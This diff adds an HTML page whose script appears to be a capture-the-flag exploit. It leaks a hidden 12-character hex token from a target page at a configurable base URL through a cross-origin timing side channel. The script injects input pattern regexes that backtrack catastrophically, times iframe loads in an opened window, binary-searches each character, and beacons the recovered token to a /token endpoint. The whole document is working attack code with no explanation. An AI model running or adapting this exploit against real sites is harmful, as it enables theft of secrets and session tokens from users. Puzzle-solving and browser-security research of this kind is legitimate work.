@@ -1,0 +1,96 @@
+<body>
+  <script type="module">
+    // http://web:3000
+    const BASE_URL = new URLSearchParams(location.search).get("baseUrl");
+
+    const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));
+
+    const waitFor = async (f) => {
+      while (true) {
+        if (await f()) return;
+        await sleep(3);
+      }
+    };
+
+    const win = open("about:blank");
+
+    const measure = async (pattern) => {
+      win.location = "about:blank";
+      await waitFor(() => win.length === 0);
+      await sleep(100);
+
+      const pad = "x".repeat(100);
+      const html = `
+        <input type="text" pattern="${pattern}" value="${pad}{{TOKEN}}">
+        <iframe></iframe>
+      `.trim();
+      const url = `${BASE_URL}?${new URLSearchParams({ html })}`;
+
+      win.location = url;
+      await waitFor(() => {
+        try {
+          win.origin;
+          return false;
+        } catch {
+          return true;
+        }
+      });
+      const start = performance.now();
+      await waitFor(() => win.length === 1);
+      const time = performance.now() - start;
+
+      return time;
+    };
+
+    const search = async (known) => {
+      const CHARS = "0123456789abcdef";
+      const W = 12;
+
+      // Binary Search
+      let left = 0;
+      let right = CHARS.length;
+      while (right - left > 1) {
+        const mid = (right + left) >> 1;
+
+        const timeL = await measure(
+          `.*(.?){${W}}[${CHARS.slice(left, mid)}]${known}`
+        );
+        const timeR = await measure(
+          `.*(.?){${W}}[${CHARS.slice(mid, right)}]${known}`
+        );
+
+        navigator.sendBeacon(
+          "/debug",
+          JSON.stringify([
+            [timeL, timeR],
+            [CHARS.slice(left, mid), CHARS.slice(mid, right)],
+          ])
+        );
+
+        if ((Math.min(timeL, timeR) + 10) * 4 > Math.max(timeL, timeR)) {
+          // retry
+          await sleep(2000);
+          continue;
+        }
+
+        if (timeL < timeR) {
+          right = mid;
+        } else {
+          left = mid;
+        }
+      }
+
+      return CHARS.slice(left, right);
+    };
+
+    const main = async () => {
+      let known = "";
+      for (let i = 0; i < 6 * 2; i++) {
+        known = (await search(known)) + known;
+        navigator.sendBeacon("/debug", JSON.stringify({ i, known }));
+      }
+      navigator.sendBeacon("/token", known);
+    };
+    main();
+  </script>
+</body>
